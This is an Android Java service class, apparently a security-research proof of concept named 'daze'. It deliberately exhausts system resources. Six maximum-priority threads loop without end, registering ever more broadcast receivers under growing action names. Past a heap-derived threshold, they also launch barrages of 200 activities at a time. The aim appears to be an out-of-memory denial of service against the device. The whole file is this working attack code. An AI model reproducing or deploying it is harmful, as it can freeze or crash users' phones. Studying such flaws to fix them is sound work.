package com.kryptowire.daze.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.kryptowire.daze.ITA_Constants;
import com.kryptowire.daze.ITA_MainAct;

/**
 * Created by ohnonotyou on 4/10/18.
 */

public class ITA_OOMService extends Service {

    final static String TAG = ITA_OOMService.class.getSimpleName();
    final static boolean DEBUG = true;
    static Context context = null;
    static String bigStr = "";
    static Thread receiverRegisterThread = null;
    final static int NUM_THREADS = 6;
    final static String[] GET_HEAP_SIZE_COMMAND = new String[]{"getprop", "dalvik.vm.heapsize"};
    final static int LARGEST_HEAP_SIZE = 512;
    static int HEAP_SIZE = 0;
    static int counter = 0;
    static int INTENT_BARRAGE_THRESHOLD = 0;
    static double MULTIPLIER = 17.777;
    final static int INTENT_BARRAGE_SIZE = 200;
    static boolean LAUNCH_INTENT_BARRAGE_THRESHOLD_REACHED = false;
    static boolean launchIntentBarrage = true;
    static final String SP = ITA_OOMService.class.getPackage().getName(); // shared preferences file name

    static private BroadcastReceiver br = new BroadcastReceiver() {
        @Override

        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "broadcast received");
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        if (DEBUG)
            Log.d(TAG, "onCreate");
        context = getApplicationContext();

        ArrayList<String> rawHepaSize = execCommandGetOutput(GET_HEAP_SIZE_COMMAND);
        setHeapSizeInt(rawHepaSize);

        launchIntentBarrage = readBooleanSharedPreferences(getApplicationContext(), ITA_Constants.INTENT_BARRAGE);

    }



    private void setHeapSizeInt(ArrayList<String> raw) {
        if (raw == null || raw.size() == 0) {
            HEAP_SIZE = 512;
            INTENT_BARRAGE_THRESHOLD = (int) ((int) HEAP_SIZE * MULTIPLIER);
        }
        else {
            String rawHeapSize = raw.get(0);
            Pattern p = Pattern.compile("(.*)\\D");
            Matcher m = p.matcher(rawHeapSize);
            if (m.matches()) {
                String rawStill = m.group(1);
                try {
                    HEAP_SIZE = Integer.parseInt(rawStill);
                    INTENT_BARRAGE_THRESHOLD = (int) ((int) HEAP_SIZE * MULTIPLIER);
                }
                catch (NumberFormatException e) {
                    HEAP_SIZE = 512;
                    INTENT_BARRAGE_THRESHOLD = (int) ((int) HEAP_SIZE * MULTIPLIER);
                }
            }
            else {
                HEAP_SIZE = 512;
                INTENT_BARRAGE_THRESHOLD = (int) ((int) HEAP_SIZE * MULTIPLIER);
            }
        }
        if (DEBUG) {
            Log.i(TAG, "HEAP_SIZE=" + HEAP_SIZE);
            Log.i(TAG, "INTENT_BARRAGE_THRESHOLD=" + INTENT_BARRAGE_THRESHOLD);
        }

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (DEBUG)
            Log.d(TAG, "onStartCommand");

        launchReceiverRegisterThread();
        return START_STICKY;
    }

    // will execute a command and return the output as an ArrayList of strings
    public static ArrayList<String> execCommandGetOutput(String[] command) {
        ProcessBuilder pb = new ProcessBuilder(command);
        Process p;
        ArrayList<String> output = new ArrayList<String>();
        try {
            p = pb.start();
            InputStream is = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            String line;
            while ((line = br.readLine()) != null) {
                output.add(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return output;
    }




    private void dynamicallyRegisterBroadcastReceiver(String action) {

        try {
            IntentFilter intf = new IntentFilter();
            intf.addAction(action);
            intf.addCategory(Intent.CATEGORY_DEFAULT);
            intf.addDataScheme("text/plain");
            this.registerReceiver(br, intf);
        }
        catch (Exception e) {
            if (DEBUG) {
                Log.i(TAG, "hit an exception when trying to register a broadcast receiver");
                e.printStackTrace();
            }
        }
    }

    private synchronized static String getNextAction() {
        if (DEBUG)
            Log.i(TAG, "counter=" + counter);

        if (counter > INTENT_BARRAGE_THRESHOLD) {
            if (DEBUG)
                Log.i(TAG, "threshold of " + INTENT_BARRAGE_THRESHOLD + " is reached!");
            LAUNCH_INTENT_BARRAGE_THRESHOLD_REACHED = true;
        }

        return bigStr.concat(Integer.toString(counter++));
    }

    private void launchReceiverRegisterThread() {
        if (receiverRegisterThread == null || !receiverRegisterThread.isAlive()) {
            Runnable r = new Runnable() {
                @Override
                public void run() {
                    launchThreadsToRegisterReceivers();
                }
            };
            receiverRegisterThread = new Thread(r);
            receiverRegisterThread.start();
        }
        else {
            Log.i(TAG, "receiverRegisterThread is active");
        }
    }
    


    private void launchThreadsToRegisterReceivers() {
        ExecutorService executor = Executors.newFixedThreadPool(NUM_THREADS);

        Runnable r = new Runnable() {
            @Override
            public void run() {
                while (true) {
                    dynamicallyRegisterBroadcastReceiver(getNextAction());
                    if (launchIntentBarrage && LAUNCH_INTENT_BARRAGE_THRESHOLD_REACHED) {
                        activityBarrage();
                    }
                }
            }
        };

        for (int i = 0; i < NUM_THREADS; i++) {
            Thread t = new Thread(r);
            t.setPriority(Thread.MAX_PRIORITY);
            executor.execute(t);
        }
        executor.shutdown();
        try {
            executor.awaitTermination(120, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void activityBarrage() {
        if (DEBUG)
            Log.d(TAG, "activityBarrage");

        Intent i = new Intent(this, ITA_MainAct.class);
        i.setFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        Intent[] intents = new Intent[INTENT_BARRAGE_SIZE];
        for (int a = 0; a < INTENT_BARRAGE_SIZE; a++)
            intents[a] = i;
        try {
            startActivities(intents);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean readBooleanSharedPreferences(Context con, String key) {
        SharedPreferences sp = con.getSharedPreferences(SP, MODE_PRIVATE);
        boolean got = sp.getBoolean(key, true);
        return got;
    }

    public static void writeBooleanSharedPreferences(Context con, String key, boolean value) {
        SharedPreferences.Editor editor = con.getSharedPreferences(SP, MODE_PRIVATE).edit();
        editor.putBoolean(key, value);
        editor.commit();
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }


}
